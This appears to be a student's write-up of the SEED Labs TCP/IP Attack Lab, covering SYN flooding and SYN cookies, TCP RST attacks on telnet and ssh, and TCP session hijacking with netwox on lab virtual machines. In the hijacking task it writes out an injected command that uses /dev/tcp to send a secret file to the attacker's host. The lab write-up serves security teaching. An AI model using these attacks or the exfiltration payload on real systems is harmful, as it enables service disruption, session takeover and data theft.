---
title: '[SEED labs] TCP/IP Attack Lab'
date: 2021-11-08 15:53
category: 'SEEDlabs'
draft: false
---

[Lab Instructions](https://seedsecuritylabs.org/Labs_16.04/PDF/TCP_Attacks.pdf)

## Network Setup

For this lab, a network between virtual machines have been made.

Copy and make 2 more Virtual Machines of `SeedUbuntu`. All machines have the network setting Attached to Bridged Adapter with different MAC Address and set as promiscuous mode.

![1-1](./images/TCPIP/Network Setup/1.PNG)

Use the `ifconfig` command and check the `enp0s3 inet addr` to check the IP address of each VM.

![1-2](./images/TCPIP/Network Setup/2.PNG)

This is how the network is set.

![1-3](./images/TCPIP/Network Setup/3.PNG)

## Task 1: SYN Flooding Attack

The objective of this task is to perform a SYN Flooding Attack using `Netwox`.

Check that a telnet connection between the server and client is possible in a normal environment.

![2-1](./images/TCPIP/Task1/1.PNG)

If we check the TCP SYN cookies parameter of the client machine, we can see that it is set as 1. Try changing this to 0.

![2-2](./images/TCPIP/Task1/2.PNG)

Generate a TCP SYN Flooding attack from the attacker using the `netwox` . If we check the network connections in the client, we can see the client is receiving multiple `SYN_RECV` tcp packets from different sources.

![2-3](./images/TCPIP/Task1/3.PNG)

If the server tries a telnet connection to the client, it fails because of to the TCP SYN Flooding attack.

![2-4](./images/TCPIP/Task1/4.PNG)If we change the TCP SYN cookie parameter of the client to 1 and try the same process again, the server can establish a telnet connection with the client.

![2-5](./images/TCPIP/Task1/5.PNG)

![2-6](./images/TCPIP/Task1/6.PNG)

![2-7](./images/TCPIP/Task1/7.PNG)

The difference is because SYN Cookies are used to prevent SYN Flooding attacks. If SYN Cookies are used, a hash `H` of the received packet is sent back to the source of the packet as the initial sequence number. If the source is not an attacker, it sends `H+1` in the acknowledgement field back. This is used to check packets if they are from an attacker or not, and whether to fill the TCB queue or not.

## Task 2: TCP RST Attacks on telnet and ssh Connections

TCP Reset attack is an attack that can terminate an established TCP connection between two victims by spoofing a RST packet to the victims. The objective of this task is to perform a TCP RST Attack using `Netwox`.

### Attack on telnet Connection

First, set a telnet connection between the server and the client.

![3-1](./images/TCPIP/Task2/1.PNG)

Perform a TCP Reset Attack using `Netwox` and check that the connection between the server and client has ended. The filter parameter is used to choose the IP address and port to send the RST packet.

![3-2](./images/TCPIP/Task2/2.PNG)

If the server tries to connect with the client again, it is impossible.

![3-3](./images/TCPIP/Task2/3.PNG)

### Attack on ssh Connections

By using the same `Netwox` command, ssh Connections can also be terminated.

This time, the attack is filtered `dst port 22` because ssh Connections use port #22.

![3-3](./images/TCPIP/Task2/4.PNG)

## Task 3: TCP Session Hijacking

The objective of this task is to hijack an existing TCP connection (session) between two victims by injecting malicious contents into this session.

First, set a telnet connection between the server and the client.

![4-1](./images/TCPIP/Task3/1.PNG)

To verify that the hijacking has succeeded, we will make a file "Secret". Capture the Telnet Connection while making the file using Wireshark.

![4-1](./images/TCPIP/Task3/2.PNG)

Open port 9090 of the attacker to get the data, and open a new terminal in the attacker machine to prepare the attack.

`netwox -40` has a variety of parameters. Use the `Sudo netwox 40 --help` command to check each parameter. For the task, we will use the following parameters.

```
-l : ip4-src ip
-m : ip4-dst ip
-o : tcp-src port
-p : tcp-dst port
-q : tcp-seqnum uint32
-E : tcp-window uint32
-r : tcp-acknum uint32
-z : no-tcp-ack
-H : tcp-data
```

Parameters can be found from the final captured packet in Wireshark.

For the data, the hex value of `'\r cat /home/seed/secret > /dev/tcp/192.168.35.135/9090\r'`

will be used. this can be calculated easily by python.

![4-3](./images/TCPIP/Task3/3.PNG)

Using the found parameters, use `Netwox` command to perform hijacking.

We can see the structure of the packet and the message "secret" saved in the secret file sent through telnet connection.

![4-4](./images/TCPIP/Task3/4.PNG)
